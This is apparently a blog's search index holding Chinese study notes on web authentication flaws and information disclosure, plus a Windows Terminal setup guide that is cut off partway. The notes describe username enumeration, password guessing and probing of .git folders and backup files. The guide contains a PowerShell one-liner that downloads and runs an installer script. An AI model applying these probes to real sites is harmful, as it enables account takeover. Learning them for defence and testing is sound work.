<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>认证（Authentication）-Web-Security-Academy学习笔记</title>
    <link href="/2020/08/20/%E8%AE%A4%E8%AF%81%EF%BC%88Authentication%EF%BC%89-Web-Security-Academy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/08/20/%E8%AE%A4%E8%AF%81%EF%BC%88Authentication%EF%BC%89-Web-Security-Academy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="认证（Authentication）"><a href="#认证（Authentication）" class="headerlink" title="认证（Authentication）"></a>认证（Authentication）</h1><h2 id="什么是认证"><a href="#什么是认证" class="headerlink" title="什么是认证"></a>什么是认证</h2><p>认证是验证和识别特定用户或客户端的过程。简而言之，即是“确认某人的身份是如其声明”。网站至少会部分暴露给任何连接到互联网的人。因此，健壮的认证机制是Web安全的基本组成部分。</p><p>不同的认证机制可以分类为以下<strong>三种认证因素</strong>：</p><ul><li>Something you <strong>know</strong>，比如密码、安全问题的答案。这种因素被称作”knowledge factors”（知识因素）；</li><li>Something you <strong>have</strong>,  如一个实物（比如手机）或一个安全令牌。这种因素被称作“possession factors”（占有因素）.</li><li>Something you <strong>are</strong> or do, 比如你的生物特征或行为模式，这种因素被称作 “inherence factors”（固有因素）.</li></ul><p>认证机制使用一系列技术来验证这些因素中的一个或多个。</p><h2 id="认证（authentication）和授权（authorization）的区别"><a href="#认证（authentication）和授权（authorization）的区别" class="headerlink" title="认证（authentication）和授权（authorization）的区别"></a>认证（authentication）和授权（authorization）的区别</h2><p>认证是验证一个用户是否是他声明的身份的过程，而授权是验证一个用户是否被允许做某些事情。</p><p>在Web站点或Web应用的语境下，认证确定了某个试图使用用户名Carlos123访问站点的人是否和创建该账户的人相同。一旦Carlos123通过了认证，他的权限决定了他是否被授权做某事，例如：访问其他用户的个人信息或进行删除其他用户账户的行为。</p><h2 id="认证漏洞是如何产生的"><a href="#认证漏洞是如何产生的" class="headerlink" title="认证漏洞是如何产生的"></a>认证漏洞是如何产生的</h2><p>广义上讲，身份验证机制中的大多数漏洞是通过以下两种方式之一产生的：</p><ul><li>认证机制由于其无法充分防御暴力破解攻击而脆弱。</li><li>由于逻辑缺陷或实现的代码错误，使得攻击者可以完全绕过认证机制。这有时被称为”broken authentication”。</li></ul><p>在Web开发的许多领域，逻辑缺陷只会导致网站异常运行，这可能是安全问题，也可能不是安全问题。但是，由于身份验证对于安全性至关重要，因此，有缺陷的身份验证逻辑使网站暴露于安全问题的可能性明显增加。</p><h2 id="认证漏洞的影响"><a href="#认证漏洞的影响" class="headerlink" title="认证漏洞的影响"></a>认证漏洞的影响</h2><p>认证漏洞的影响可能非常严重。一旦攻击者绕过认证或爆破攻击成功，进入另一个用户的帐户，他们就可以访问该帐户拥有的所有数据和功能。如果他们能够入侵系统管理员等高特权帐户，则他们可以完全控制整个应用程序，并有可能获得对内部基础结构的访问权限。</p><p>即使受攻击的是低特权帐户，也仍可能使攻击者获得他们不应该拥有的数据的访问权限，例如敏感的商业信息。即使该帐户无法访问任何敏感数据，它仍可能允许攻击者访问其他页面，从而提供了进一步的攻击面。通常，从公开访问的页面上将无法进行某些高严重性攻击，但是从内部页面上则是可能的。</p><h2 id="认证机制中的漏洞"><a href="#认证机制中的漏洞" class="headerlink" title="认证机制中的漏洞"></a>认证机制中的漏洞</h2><p>网站的身份验证系统通常由几种可能发生漏洞的不同机制组成。一些漏洞广泛适用于所有这些情况，而其他漏洞则更特定于所提供的功能。</p><h3 id="基于密码的登录中的漏洞"><a href="#基于密码的登录中的漏洞" class="headerlink" title="基于密码的登录中的漏洞"></a>基于密码的登录中的漏洞</h3><p>password-based login process：用户自行注册，或由管理员分配账户；账户与一组独特的username和password关联。用户在登录表单中输入以进行认证。</p><p>在这种情况下，某人知道密码的事实即足以证明其身份。因此，若攻击者能够猜测或获取其他用户的登录凭据。站点的安全性就会受损。</p><p>这可以通过以下方式实现：</p><h4 id="暴力破解攻击（Brute-force-attacks）"><a href="#暴力破解攻击（Brute-force-attacks）" class="headerlink" title="暴力破解攻击（Brute-force attacks）"></a>暴力破解攻击（Brute-force attacks）</h4><p>暴力破解的概念略。</p><p>暴力破解不总是随机数猜测用户名和密码。通过利用一些基本的逻辑或公开的知识，攻击者可微调攻击方式以进行更有效的猜测，有助于提高攻击效率。如果没有对暴力破解进行有效的防护，仅使用基于密码的登录作为认证方式的站点可能会非常脆弱。</p><h5 id="暴力破解用户名"><a href="#暴力破解用户名" class="headerlink" title="暴力破解用户名"></a>暴力破解用户名</h5><p>若用户名符合可识别的模式，则较容易猜测，例如：</p><ul><li>电子邮箱：如常见格式 firstname.lastname @ somecompany.com</li><li>高权限用户名：常见如admin、administrator</li></ul><p>在对站点安全性审计的过程中，检查其是否公开披露了潜在的用户名。如：是否无需登录即可访问用户档案页面？即使此类页面的实际信息是隐藏的，也可能泄露其用户名。</p><p>此外应检查HTTP响应，以查看是否公开了电子邮箱。有时响应中会包含管理员或IT支持人员等高权限账户的email地址。</p><h5 id="暴力破解密码"><a href="#暴力破解密码" class="headerlink" title="暴力破解密码"></a>暴力破解密码</h5><p>很多站点会要求用户设置足够复杂的密码，以使其难以单纯被爆破，常见要求如：</p><ul><li>最少字符数量</li><li>大小写字母混合</li><li>至少一个特殊字符</li></ul><p>然而，尽管对于电脑来说爆破这种密码很难，但可以利用对人类行为的基础知识来破解。比起完全随机的字符组合，用户常会使用自己能记住的常用密码，并微调使其符合站点对密码的要求。如：mypassword可能改为Mypassword1！，或是Myp4$$w0rd。</p><p>如果站点策略要求定期修改密码，可能有：Mypassword1！、Mypassword2！……</p><p>对可能的用户凭证和可预测的用户行为模式的了解，可以使暴力破解攻击更加复杂而有效。</p><h5 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h5><p>Username enumeration：攻击者通过观察站点行为变化，以确定特定的用户名是否是有效的。</p><p>如登录时提示输入了有效用户名和错误的密码，或注册时提示填入了已被占用的用户名。可据此生成有效的用户名列表，能极大减少爆破所需的时间和精力。</p><p>在尝试暴力破解一个登录页面时，要注意如下方面的任何差异：</p><ul><li>状态码：爆破中大部分错误猜测的HTTP响应状态码应一致，若出现不一致的状态码，很可能是猜测用户名有效。对站点而言最佳选择是不论认证结果如何，都使状态码保持一致。</li><li>错误信息：有时根据是用户名、密码都错误，或是仅密码错误，返回的错误信息会不同。最好的做法是在两种情况下都使用一个通用的错误信息。并注意不要有细微之处的差异。</li><li>响应时间：若大多数请求的响应时间相似，任何偏离此时间的请求表明后台发生的事情不同。比如，站点仅在验证用户名有效时才验证密码是否正确。这可能指示猜测到了正确的用户名。这种差别可能很细微，但攻击者可以通过输入过长的密码来使延时更明显。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web Security Academy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息泄露漏洞-Web Security Academy学习笔记</title>
    <link href="/2020/07/28/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-Web-Security-Academy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/07/28/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-Web-Security-Academy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="信息泄露漏洞-Web-Security-Academy学习笔记"><a href="#信息泄露漏洞-Web-Security-Academy学习笔记" class="headerlink" title="信息泄露漏洞-Web Security Academy学习笔记"></a>信息泄露漏洞-Web Security Academy学习笔记</h1><h2 id="什么是信息泄露？"><a href="#什么是信息泄露？" class="headerlink" title="什么是信息泄露？"></a>什么是信息泄露？</h2><p>Information disclosure （aka，information leakage）：网站在设计意图外向用户暴露敏感数据，如：</p><ul><li>用户信息，如用户名、资产信息</li><li>敏感的商业数据或业务数据</li><li>站点（及其架构）的技术细节信息</li></ul><p>前二者的危害显而易见，而技术信息有时会为攻击者进行攻击提供线索，危害也十分严重。</p><a id="more"></a><h2 id="信息泄露的例子"><a href="#信息泄露的例子" class="headerlink" title="信息泄露的例子"></a>信息泄露的例子</h2><ul><li>robots.txt 或目录列表文件会泄露站点隐藏路径，目录结构和内容</li><li>通过临时备份文件访问到部分源代码</li><li>报错信息泄露数据库表名、列名等信息</li><li>源代码中hard-coded的API keys，IP地址，数据库用户名密码等</li><li>通过应用行为的细微差异，提示资源、用户名等信息（e.g. 时间盲注，布尔盲注等）</li></ul><h2 id="信息泄露的途径"><a href="#信息泄露的途径" class="headerlink" title="信息泄露的途径"></a>信息泄露的途径</h2><ul><li>没有从公开的内容中移除内部信息（e.g. 源代码中的开发者注释没有删除）</li><li>站点相关的技术配置不安全（e.g. 没有禁用调试和诊断功能；使用默认配置导致输出包含敏感信息的报错）</li><li>应用设计和行为存在缺陷（e.g. 在不同错误发生时返回不同的响应，可能被攻击者利用来枚举敏感数据等）</li></ul><h2 id="信息泄露的影响"><a href="#信息泄露的影响" class="headerlink" title="信息泄露的影响"></a>信息泄露的影响</h2><ul><li>泄露用户身份、财产等敏感信息：不用说了</li><li>泄露技术信息：帮攻击者打开思路，缩小尝试范围，如使用某站点架构特定版本的漏洞。严重程度取决于攻击者如何利用这些信息</li></ul><h2 id="如何寻找并利用信息泄露漏洞"><a href="#如何寻找并利用信息泄露漏洞" class="headerlink" title="如何寻找并利用信息泄露漏洞"></a>如何寻找并利用信息泄露漏洞</h2><h3 id="常见信息泄露源"><a href="#常见信息泄露源" class="headerlink" title="常见信息泄露源"></a>常见信息泄露源</h3><ul><li><p>爬虫相关文件</p><p>/robots.txt 和 /sitemap.xml 包含了站点中不想让爬虫扫描的路径，这些路径通常不与站点内其他页面链接，因此可能不出现在 Burpsuite 等扫描器的 site map中。可以尝试手动访问获取有用信息。</p></li><li><p>目录列表</p><p>Web 服务器可以被配置为，对没有index页面的目录，自动列出路径下内容。大大方便攻击者确定站点结构，寻找敏感信息。</p><p>目录列表本身并不一定是安全漏洞，但当站点没有很好地实现访问控制时。目录列表对敏感资源位置的泄露就十分危险了。</p></li><li><p>开发者注释</p><p>开发过程中的HTML行间注释可能出于疏忽或开发者安全意识不足而未被删除，从而部署至生产环境。这些注释很容易通过工具定位。并有可能包含对攻击者有用的信息，如提示隐藏的目录或包含业务逻辑的线索。</p></li><li><p>错误信息</p><p>过于冗长的错误信息是最常见的信息泄露方式之一。在渗透测试过程中，需要对触发的每一个错误信息加以关注。</p><p>错误信息可能提示的信息举例：</p><ul><li>输入的数据类型与预期参数类型；这可以帮助攻击者确定可供攻击的参数。</li><li>站点使用的技术信息：web engine、数据库、服务器的类型及版本号等；攻击者可以针对特定版本进行后续攻击。如站点使用开源架构，可以针对其源码进行代码审计以寻找攻击点。</li><li>错误信息的差异可以提示web应用行为的不同，观察错误信息的差异是很多攻击技术的重要方面。如SQL注入（盲注）、用户名枚举（Username不存在 or Username或password不正确）。</li></ul></li><li><p>调试数据</p><p>站点因调试目的而生成的错误信息和日志可能包含大量攻击者需要的信息，如：</p><ul><li>Values for key session variables that can be manipulated via user input</li><li>Hostnames and credentials for back-end components</li><li>File and directory names on the server</li><li>Keys used to encrypt data transmitted via the client</li></ul></li><li><p>用户账户页</p><p>某些站点在访问用户个人账户页面时存在逻辑缺陷，如<code>GET /user/personal-info?user=carlos</code>改变user参数可能导致访问任意用户账户页。</p></li><li><p>包含源代码的备份文件</p><p>源代码可以：</p><ul><li>帮助攻击者理解站点应用行为和业务逻辑</li><li>一些敏感信息（API keys，访问后端组件的认证信息（如数据库用户名密码））可能硬写在源代码中。</li></ul><p>在站点中发现的源代码文件（如.php）通常不能直接访问文本而是被执行。但在某些情况下可以尝试获取源码文本。</p><p>文本编辑器常在文件变动时创建临时备份文件，通常在文件名前加~，或者添加特定后缀（如.bak），尝试访问这些文件可能会得到源代码文本。</p></li><li><p>不安全配置导致的泄露</p><p>站点的不正确配置常常会导致安全漏洞，这是由于站点普遍使用第三方技术，这些技术有大量的接口和配置项，配置站点人员并未完整理解。</p><p>此外，开发者常常忘记在生产环境中禁用一些调试项。例如，HTTP 的 <strong>TRACE方法</strong> 是为诊断目的而设计，使用该方法会返回exact request that was received。通常是无害的，但有可能会导致信息泄露。如internal authentication headers可能会被反向代理添加到用户请求后。</p></li><li><p>版本控制历史</p><p>/.git 目录包含站点所有的版本控制数据，可能被部署到生产环境。可以直接访问路径，也可用本地的git来访问。</p><p>可能不能得到全部的源代码，但对比各版本的diff可以读到部分代码片段，或许能找到敏感信息（如上文所述的hard-coded的key或者credentials）。</p></li></ul><h2 id="如何预防信息泄露漏洞"><a href="#如何预防信息泄露漏洞" class="headerlink" title="如何预防信息泄露漏洞"></a>如何预防信息泄露漏洞</h2><p>信息泄露漏洞可能在各种地方出现，预防此类漏洞的原则如下；</p><ul><li>所有开发者应明确什么信息是敏感信息</li><li>生产过程中对所有代码进行审计</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web Security Academy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows Terminal 配置美化</title>
    <link href="/2020/07/11/Windows-Terminal-%E9%85%8D%E7%BD%AE%E7%BE%8E%E5%8C%96/"/>
    <url>/2020/07/11/Windows-Terminal-%E9%85%8D%E7%BD%AE%E7%BE%8E%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h4 id="Windows-Terminal-安装配置"><a href="#Windows-Terminal-安装配置" class="headerlink" title="Windows Terminal 安装配置"></a>Windows Terminal 安装配置</h4><p>在Microsoft Store安装即可。</p><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>菜单—&gt; 设置，打开settings.json</p><pre><code class="hljs json"><span class="hljs-comment">// To view the default settings, hold "alt" while clicking on the "Settings" button.</span><span class="hljs-comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span>&#123;    <span class="hljs-attr">"$schema"</span>: <span class="hljs-string">"https://aka.ms/terminal-profiles-schema"</span>,    <span class="hljs-attr">"defaultProfile"</span>: <span class="hljs-string">"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;"</span>,    <span class="hljs-attr">"profiles"</span>: [        &#123;            <span class="hljs-comment">// Make changes here to the powershell.exe profile</span>            <span class="hljs-attr">"background"</span>: <span class="hljs-string">"#000000"</span>,            <span class="hljs-attr">"backgroundImage"</span>: <span class="hljs-string">"C:\\WinTerminal Config\\background.jpg"</span>,            <span class="hljs-attr">"backgroundImageOpacity"</span>: <span class="hljs-number">0.6</span>,            <span class="hljs-attr">"guid"</span>: <span class="hljs-string">"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;"</span>,            <span class="hljs-attr">"name"</span>: <span class="hljs-string">"Windows PowerShell"</span>,            <span class="hljs-attr">"commandline"</span>: <span class="hljs-string">"powershell.exe"</span>,            <span class="hljs-attr">"colorScheme"</span>: <span class="hljs-string">"Monokai Remastered"</span>,            <span class="hljs-attr">"useAcrylic"</span>: <span class="hljs-literal">false</span>,            <span class="hljs-attr">"acrylicOpacity"</span>: <span class="hljs-number">0.7</span>,            <span class="hljs-attr">"closeOnExit"</span>: <span class="hljs-literal">true</span>,            <span class="hljs-attr">"acrylicOpacity"</span>: <span class="hljs-number">0.25</span>,            <span class="hljs-attr">"cursorColor"</span>: <span class="hljs-string">"#FFFFFF"</span>,            <span class="hljs-attr">"fontFace"</span>: <span class="hljs-string">"Delugia Nerd Font"</span>,            <span class="hljs-attr">"fontFace"</span>: <span class="hljs-string">"等距更纱黑体 SC"</span>,            <span class="hljs-attr">"hidden"</span>: <span class="hljs-literal">false</span>,            <span class="hljs-attr">"tabTitle"</span>: <span class="hljs-string">"Powershell"</span>,            <span class="hljs-attr">"startingDirectory"</span>: <span class="hljs-string">"."</span>        &#125;,        &#123;            <span class="hljs-comment">// Make changes here to the cmd.exe profile</span>            <span class="hljs-attr">"background"</span>: <span class="hljs-string">"#000000"</span>,            <span class="hljs-attr">"backgroundImage"</span>: <span class="hljs-string">"C://1.jpg"</span>,            <span class="hljs-attr">"backgroundImageOpacity"</span>: <span class="hljs-number">0.5</span>,            <span class="hljs-attr">"guid"</span>: <span class="hljs-string">"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;"</span>,            <span class="hljs-attr">"name"</span>: <span class="hljs-string">"cmd"</span>,            <span class="hljs-attr">"commandline"</span>: <span class="hljs-string">"cmd.exe"</span>,            <span class="hljs-attr">"colorScheme"</span>: <span class="hljs-string">"Monokai Remastered"</span>,            <span class="hljs-attr">"useAcrylic"</span>: <span class="hljs-literal">true</span>,            <span class="hljs-attr">"acrylicOpacity"</span>: <span class="hljs-number">0.7</span>,            <span class="hljs-attr">"closeOnExit"</span>: <span class="hljs-literal">true</span>,            <span class="hljs-attr">"acrylicOpacity"</span>: <span class="hljs-number">0.25</span>,            <span class="hljs-attr">"cursorColor"</span>: <span class="hljs-string">"#FFFFFF"</span>,            <span class="hljs-attr">"fontFace"</span>: <span class="hljs-string">"Delugia Nerd Font"</span>,            <span class="hljs-attr">"hidden"</span>: <span class="hljs-literal">false</span>        &#125;,        &#123;            <span class="hljs-attr">"background"</span>: <span class="hljs-string">"#000000"</span>,            <span class="hljs-attr">"backgroundImage"</span>: <span class="hljs-string">"C://1.jpg"</span>,            <span class="hljs-attr">"backgroundImageOpacity"</span>: <span class="hljs-number">0.6</span>,            <span class="hljs-attr">"guid"</span>: <span class="hljs-string">"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;"</span>,            <span class="hljs-attr">"colorScheme"</span>: <span class="hljs-string">"AdventureTime"</span>,            <span class="hljs-attr">"useAcrylic"</span>: <span class="hljs-literal">true</span>,            <span class="hljs-attr">"acrylicOpacity"</span>: <span class="hljs-number">0.7</span>,            <span class="hljs-attr">"closeOnExit"</span>: <span class="hljs-literal">true</span>,            <span class="hljs-attr">"acrylicOpacity"</span>: <span class="hljs-number">0.25</span>,            <span class="hljs-attr">"cursorColor"</span>: <span class="hljs-string">"#FFFFFF"</span>,            <span class="hljs-attr">"fontFace"</span>: <span class="hljs-string">"Delugia Nerd Font"</span>,            <span class="hljs-attr">"hidden"</span>: <span class="hljs-literal">false</span>,            <span class="hljs-attr">"name"</span>: <span class="hljs-string">"Azure Cloud Shell"</span>,            <span class="hljs-attr">"source"</span>: <span class="hljs-string">"Windows.Terminal.Azure"</span>        &#125;    ],    <span class="hljs-comment">// Add custom color schemes to this array</span>    <span class="hljs-attr">"schemes"</span>: [        &#123;            <span class="hljs-attr">"name"</span>: <span class="hljs-string">"3024 Day"</span>,            <span class="hljs-attr">"black"</span>: <span class="hljs-string">"#090300"</span>,            <span class="hljs-attr">"red"</span>: <span class="hljs-string">"#db2d20"</span>,            <span class="hljs-attr">"green"</span>: <span class="hljs-string">"#01a252"</span>,            <span class="hljs-attr">"yellow"</span>: <span class="hljs-string">"#fded02"</span>,            <span class="hljs-attr">"blue"</span>: <span class="hljs-string">"#01a0e4"</span>,            <span class="hljs-attr">"purple"</span>: <span class="hljs-string">"#a16a94"</span>,            <span class="hljs-attr">"cyan"</span>: <span class="hljs-string">"#b5e4f4"</span>,            <span class="hljs-attr">"white"</span>: <span class="hljs-string">"#a5a2a2"</span>,            <span class="hljs-attr">"brightBlack"</span>: <span class="hljs-string">"#5c5855"</span>,            <span class="hljs-attr">"brightRed"</span>: <span class="hljs-string">"#e8bbd0"</span>,            <span class="hljs-attr">"brightGreen"</span>: <span class="hljs-string">"#3a3432"</span>,            <span class="hljs-attr">"brightYellow"</span>: <span class="hljs-string">"#4a4543"</span>,            <span class="hljs-attr">"brightBlue"</span>: <span class="hljs-string">"#807d7c"</span>,            <span class="hljs-attr">"brightPurple"</span>: <span class="hljs-string">"#d6d5d4"</span>,            <span class="hljs-attr">"brightCyan"</span>: <span class="hljs-string">"#cdab53"</span>,            <span class="hljs-attr">"brightWhite"</span>: <span class="hljs-string">"#f7f7f7"</span>,            <span class="hljs-attr">"background"</span>: <span class="hljs-string">"#f7f7f7"</span>,            <span class="hljs-attr">"foreground"</span>: <span class="hljs-string">"#4a4543"</span>        &#125;,        &#123;            <span class="hljs-attr">"name"</span>: <span class="hljs-string">"AdventureTime"</span>,            <span class="hljs-attr">"black"</span>: <span class="hljs-string">"#050404"</span>,            <span class="hljs-attr">"red"</span>: <span class="hljs-string">"#bd0013"</span>,            <span class="hljs-attr">"green"</span>: <span class="hljs-string">"#4ab118"</span>,            <span class="hljs-attr">"yellow"</span>: <span class="hljs-string">"#e7741e"</span>,            <span class="hljs-attr">"blue"</span>: <span class="hljs-string">"#0f4ac6"</span>,            <span class="hljs-attr">"purple"</span>: <span class="hljs-string">"#665993"</span>,            <span class="hljs-attr">"cyan"</span>: <span class="hljs-string">"#70a598"</span>,            <span class="hljs-attr">"white"</span>: <span class="hljs-string">"#f8dcc0"</span>,            <span class="hljs-attr">"brightBlack"</span>: <span class="hljs-string">"#4e7cbf"</span>,            <span class="hljs-attr">"brightRed"</span>: <span class="hljs-string">"#fc5f5a"</span>,            <span class="hljs-attr">"brightGreen"</span>: <span class="hljs-string">"#9eff6e"</span>,            <span class="hljs-attr">"brightYellow"</span>: <span class="hljs-string">"#efc11a"</span>,            <span class="hljs-attr">"brightBlue"</span>: <span class="hljs-string">"#1997c6"</span>,            <span class="hljs-attr">"brightPurple"</span>: <span class="hljs-string">"#9b5953"</span>,            <span class="hljs-attr">"brightCyan"</span>: <span class="hljs-string">"#c8faf4"</span>,            <span class="hljs-attr">"brightWhite"</span>: <span class="hljs-string">"#f6f5fb"</span>,            <span class="hljs-attr">"background"</span>: <span class="hljs-string">"#1f1d45"</span>,            <span class="hljs-attr">"foreground"</span>: <span class="hljs-string">"#f8dcc0"</span>        &#125;,        &#123;            <span class="hljs-attr">"name"</span>: <span class="hljs-string">"Monokai Remastered"</span>,            <span class="hljs-attr">"black"</span>: <span class="hljs-string">"#1a1a1a"</span>,            <span class="hljs-attr">"red"</span>: <span class="hljs-string">"#f4005f"</span>,            <span class="hljs-attr">"green"</span>: <span class="hljs-string">"#98e024"</span>,            <span class="hljs-attr">"yellow"</span>: <span class="hljs-string">"#fd971f"</span>,            <span class="hljs-attr">"blue"</span>: <span class="hljs-string">"#9d65ff"</span>,            <span class="hljs-attr">"purple"</span>: <span class="hljs-string">"#f4005f"</span>,            <span class="hljs-attr">"cyan"</span>: <span class="hljs-string">"#58d1eb"</span>,            <span class="hljs-attr">"white"</span>: <span class="hljs-string">"#c4c5b5"</span>,            <span class="hljs-attr">"brightBlack"</span>: <span class="hljs-string">"#625e4c"</span>,            <span class="hljs-attr">"brightRed"</span>: <span class="hljs-string">"#f4005f"</span>,            <span class="hljs-attr">"brightGreen"</span>: <span class="hljs-string">"#98e024"</span>,            <span class="hljs-attr">"brightYellow"</span>: <span class="hljs-string">"#e0d561"</span>,            <span class="hljs-attr">"brightBlue"</span>: <span class="hljs-string">"#9d65ff"</span>,            <span class="hljs-attr">"brightPurple"</span>: <span class="hljs-string">"#f4005f"</span>,            <span class="hljs-attr">"brightCyan"</span>: <span class="hljs-string">"#58d1eb"</span>,            <span class="hljs-attr">"brightWhite"</span>: <span class="hljs-string">"#f6f6ef"</span>,            <span class="hljs-attr">"background"</span>: <span class="hljs-string">"#0c0c0c"</span>,            <span class="hljs-attr">"foreground"</span>: <span class="hljs-string">"#d9d9d9"</span>        &#125;,        &#123;            <span class="hljs-attr">"name"</span>: <span class="hljs-string">"Solarized Darcula"</span>,            <span class="hljs-attr">"black"</span>: <span class="hljs-string">"#25292a"</span>,            <span class="hljs-attr">"red"</span>: <span class="hljs-string">"#f24840"</span>,            <span class="hljs-attr">"green"</span>: <span class="hljs-string">"#629655"</span>,            <span class="hljs-attr">"yellow"</span>: <span class="hljs-string">"#b68800"</span>,            <span class="hljs-attr">"blue"</span>: <span class="hljs-string">"#2075c7"</span>,            <span class="hljs-attr">"purple"</span>: <span class="hljs-string">"#797fd4"</span>,            <span class="hljs-attr">"cyan"</span>: <span class="hljs-string">"#15968d"</span>,            <span class="hljs-attr">"white"</span>: <span class="hljs-string">"#d2d8d9"</span>,            <span class="hljs-attr">"brightBlack"</span>: <span class="hljs-string">"#25292a"</span>,            <span class="hljs-attr">"brightRed"</span>: <span class="hljs-string">"#f24840"</span>,            <span class="hljs-attr">"brightGreen"</span>: <span class="hljs-string">"#629655"</span>,            <span class="hljs-attr">"brightYellow"</span>: <span class="hljs-string">"#b68800"</span>,            <span class="hljs-attr">"brightBlue"</span>: <span class="hljs-string">"#2075c7"</span>,            <span class="hljs-attr">"brightPurple"</span>: <span class="hljs-string">"#797fd4"</span>,            <span class="hljs-attr">"brightCyan"</span>: <span class="hljs-string">"#15968d"</span>,            <span class="hljs-attr">"brightWhite"</span>: <span class="hljs-string">"#d2d8d9"</span>,            <span class="hljs-attr">"background"</span>: <span class="hljs-string">"#3d3f41"</span>,            <span class="hljs-attr">"foreground"</span>: <span class="hljs-string">"#d2d8d9"</span>        &#125;    ],    <span class="hljs-comment">// Add any keybinding overrides to this array.</span>    <span class="hljs-comment">// To unbind a default keybinding, set the command to "unbound"</span>    <span class="hljs-attr">"keybindings"</span>: []&#125;</code></pre><ul><li>重要配置项说明</li></ul><pre><code class="hljs json"><span class="hljs-comment">// 背景图片及透明度，注意路径中用双斜杠\\</span>            "backgroundImage": "C:\\WinTerminal Config\\background.jpg",            "backgroundImageOpacity": 0.6,<span class="hljs-comment">// guid,配置profile的标识码，可以有多个配置，在文件开头"defaultProfile"用guid选择</span>            "guid": "&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;",<span class="hljs-comment">// 区分应用的shell：powershell？cmd？</span>            "name": "Windows PowerShell",            "commandline": "powershell.exe",<span class="hljs-comment">// 颜色主题，在文件下面可以添加多个，在"colorScheme"里选择</span>            "colorScheme": "Monokai Remastered",<span class="hljs-comment">// 毛玻璃半透明特效开关，透明度</span>            "useAcrylic": false,            "acrylicOpacity": 0.7,<span class="hljs-comment">// 该字体是能适应oh-my-posh的等宽字体</span>            "fontFace": "等距更纱黑体 SC",<span class="hljs-comment">// 添加右键菜单后，配置默认打开路径为当前路径</span>            "startingDirectory": "."</code></pre><h5 id="配色方案"><a href="#配色方案" class="headerlink" title="配色方案"></a>配色方案</h5><p>配色方案下载：<a href="https://github.com/mbadolato/iTerm2-Color-Schemes/tree/master/windowsterminal" target="_blank" rel="noopener">iTerm2-Color-Schemes</a></p><h5 id="右键菜单项"><a href="#右键菜单项" class="headerlink" title="右键菜单项"></a>右键菜单项</h5><p>新建一个<code>.reg</code>文件：</p><pre><code class="hljs taggerscript">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT<span class="hljs-symbol">\D</span>irectory<span class="hljs-symbol">\B</span>ackground<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\w</span>t]@="Windows Terminal here""Icon"="C:<span class="hljs-symbol">\\</span>WinTerminal Config<span class="hljs-symbol">\\</span>terminal.ico"[HKEY_CLASSES_ROOT<span class="hljs-symbol">\D</span>irectory<span class="hljs-symbol">\B</span>ackground<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\w</span>t<span class="hljs-symbol">\c</span>ommand]@="C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span>Architect<span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Microsoft<span class="hljs-symbol">\\</span>WindowsApps<span class="hljs-symbol">\\</span>wt.exe"</code></pre><p>保存后运行即可。</p><h4 id="oh-my-posh安装配置"><a href="#oh-my-posh安装配置" class="headerlink" title="oh-my-posh安装配置"></a>oh-my-posh安装配置</h4><h5 id="安装包管理器Chocolatey"><a href="#安装包管理器Chocolatey" class="headerlink" title="安装包管理器Chocolatey"></a>安装包管理器Chocolatey</h5><pre><code class="hljs powershell"><span class="hljs-comment"># 管理员模式运行powershell</span><span class="hljs-built_in">Set-ExecutionPolicy</span> Bypass <span class="hljs-literal">-Scope</span> <span class="hljs-keyword">Process</span> <span class="hljs-literal">-Force</span>; [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol <span class="hljs-operator">-bor</span> <span class="hljs-number">3072</span>; iex ((<span class="hljs-built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="hljs-string">'https://chocolatey.org/install.ps1'</span>))</code></pre><h5 id="安装oh-my-posh"><a href="#安装oh-my-posh" class="headerlink" title="安装oh-my-posh"></a>安装oh-my-posh</h5><pre><code class="hljs powershell"><span class="hljs-comment"># 管理员模式运行powershell</span>choco install ConEmu<span class="hljs-built_in">Install-Module</span> posh<span class="hljs-literal">-git</span> <span class="hljs-literal">-Scope</span> CurrentUser<span class="hljs-built_in">Install-Module</span> oh<span class="hljs-literal">-my</span><span class="hljs-literal">-posh</span> <span class="hljs-literal">-Scope</span> CurrentUser<span class="hljs-comment"># 设置profile配置文件</span><span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">Test-Path</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$PROFILE</span> )) &#123; <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Type</span> File <span class="hljs-literal">-Path</span> <span class="hljs-variable">$PROFILE</span> <span class="hljs-literal">-Force</span> &#125;<span class="hljs-comment"># 配置默认开启oh-my-posh</span><span class="hljs-built_in">Import-Module</span> posh<span class="hljs-literal">-git</span><span 